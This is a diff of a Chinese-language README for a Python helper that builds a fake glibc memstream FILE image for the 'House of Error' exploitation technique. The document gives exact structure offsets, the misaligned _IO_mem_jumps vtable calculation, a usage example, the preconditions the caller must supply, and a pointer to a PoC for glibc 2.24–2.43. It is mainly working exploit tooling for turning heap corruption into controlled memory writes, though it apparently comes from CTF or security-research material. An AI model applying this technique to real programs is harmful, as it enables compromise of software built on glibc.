@@ -63,28 +63,115 @@ fake_vtable = _IO_mem_jumps + (0x60 - 0x28)
 
 ## Python 离线板子
 
+[`error.py`](./error.py) 提供 `build_house_of_error`，生成 `_IO_mem_sync` 双写消费点的 memstream FILE 镜像。
+
+### 函数用途
+
+构造 `_IO_mem_sync` 触发时所需的对象：
+
+```text
+*mp->bufloc = fp->_IO_write_base
+*mp->sizeloc = fp->_IO_write_ptr - fp->_IO_write_base
+```
+
+通过合法偏移 vtable 让 `__uflow` 落到 `_IO_mem_sync`。
+
+### 最小使用示例
+
 ```python
 from error import build_house_of_error
 
 writes = build_house_of_error(
-    file_addr=fake_file,
-    mem_jumps_addr=libc_base + mem_jumps_offset,
-    bufloc_addr=target_pointer_slot,
-    sizeloc_addr=target_size_slot,
-    write_base_addr=controlled_buffer,
-    write_length=0x123,
+    file_addr=0x100000,          # memstream FILE
+    mem_jumps_addr=0x7fff0000,   # _IO_mem_jumps
+    bufloc_addr=0x200000,        # 第一次写入目标
+    sizeloc_addr=0x200008,       # 第二次写入目标
+    write_base_addr=0x300000,    # 写入值 = write_base
+    write_length=0x123,          # 写入值 = ptr - base
 )
+
+w = writes[0]
+print(w.label, hex(w.address), w.data.hex())
 ```
+
+### 对应 PoC
+
+- [`poc_mem_sync_2.24_2.43.c`](./poc_mem_sync_2.24_2.43.c)。
+
+### 核心偏移
+
+```text
+FILE + 0xd8  vtable
+FILE + 0xf0  bufloc（指向被写入的 qword 指针）
+FILE + 0xf8  sizeloc（指向被写入的 size qword）
+```
+
+vtable 错位计算：
+
+```text
+sync 槽偏移 0x60
+uflow 槽偏移 0x28
+vtable = mem_jumps_addr + 0x38
+```
+
+### 参数
 
 | 参数 | 含义 |
 |---|---|
 | `file_addr` | fake/被覆盖 memstream FILE 地址。 |
-| `mem_jumps_addr` | `_IO_mem_jumps` 地址；函数按 `sync(0x60)-uflow(0x28)=+0x38` 生成合法偏移 vtable。 |
-| `bufloc_addr` / `sizeloc_addr` | `_IO_mem_sync` 两次写入的目标地址。 |
+| `mem_jumps_addr` | 目标 libc 的 `_IO_mem_jumps` 地址。 |
+| `bufloc_addr` | `_IO_mem_sync` 第一次写入的目标地址。 |
+| `sizeloc_addr` | `_IO_mem_sync` 第二次写入的目标地址。 |
 | `write_base_addr` | 第一次写入的值，即 `_IO_write_base`。 |
-| `write_length` | `_IO_write_ptr - _IO_write_base`，第二次写入的 size 值；不是独立任意 qword。 |
+| `write_length` | `_IO_write_ptr - _IO_write_base`，第二次写入的 size 值；必须大于 0。 |
 
-返回一个 memstream FILE 镜像，函数不负责投递、触发或修复 Build ID 私有布局。
+### 返回对象
+
+返回一个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+本次返回内容：
+
+```text
+address: file_addr
+data:    0x100 字节 memstream FILE 镜像
+label:   "memstream FILE + mem_sync vtable"
+```
+
+镜像关键字段：
+
+```text
++0x20  _IO_write_base = write_base_addr
++0x28  _IO_write_ptr = write_base_addr + write_length
++0x30  _IO_write_end = write_base_addr + write_length + 1
++0xd8  vtable = mem_jumps_addr + 0x38
++0xf0  bufloc = bufloc_addr
++0xf8  sizeloc = sizeloc_addr
+```
+
+注意第二次写不是独立任意 qword；`sizeloc` 写入的是 `_IO_write_ptr - _IO_write_base`，受差值约束。
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_mem_jumps 地址
+可写且初始为零的 lock 区
+能触发 __uflow 的入口
+flags 中清除 CURRENTLY_PUTTING，并让 _mode 满足消费路径
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 投递到 stderr/流链
+不触发 __malloc_assert 或标准流消费点
+不负责 2.36+ 的替代触发方式
+```
 
 ```bash
 ./tools/run_in_docker.sh 2.35 house_of_error/poc_mem_sync_2.24_2.43.c
